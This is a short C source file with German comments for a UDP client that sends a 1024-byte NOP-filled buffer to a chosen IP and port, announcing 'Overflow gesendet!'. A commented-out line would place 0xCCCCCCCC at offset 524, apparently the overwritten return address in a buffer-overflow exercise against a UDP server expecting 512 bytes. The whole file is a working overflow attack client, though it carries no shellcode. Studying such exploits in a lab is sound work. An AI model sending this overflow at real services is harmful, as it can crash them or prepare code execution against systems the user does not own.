
#include "includes.h"

SOCKET global_socket;

void StartClient(DWORD ip, WORD port)
{
	//Winsock muss erst initialisiert werden
	WSADATA data;
	char Buffer[1024];

	if (WSAStartup(MAKEWORD(2, 2), &data) != 0)
	{
		printf("WSAStartup nicht erfolgreich.\n");
		return;
	}

	//Erstelle einen UDP socket
	global_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

	//Fülle alle erforderlichen serverdaten aus (IP port usw)
	sockaddr_in serverdata;
	memset(&serverdata, 0, sizeof(sockaddr_in));
	serverdata.sin_family = AF_INET;
	serverdata.sin_addr.s_addr = ip;
	serverdata.sin_port = htons(port);

	printf("\n\n\nClient erfolgreich verbunden.\n");

	//Warte auf Benutzer Eingabe und sende (wenn enter gedrückt wird)
	while (true)
	{
		//*(DWORD*)(&Buffer[0] + 524) = 0xCCCCCCCC;

		memset(Buffer, 0x90, 1024);
		//Einzige Änderung: 1024 anstatt 512 bytes werden gesendet.
		sendto(global_socket, Buffer, 1024, 0, (sockaddr*)&serverdata, sizeof(sockaddr_in));
	
		printf("Overflow gesendet!\n");

		system("pause");
	}
}


void main()
{
	DWORD ip;
	WORD port;

	char ipbuff[24];

	scanf("%s\n%hu", &ipbuff, &port);

	ip = inet_addr(ipbuff);

	printf("%s : %hu\n", ipbuff, port);

	StartClient(ip, port);
}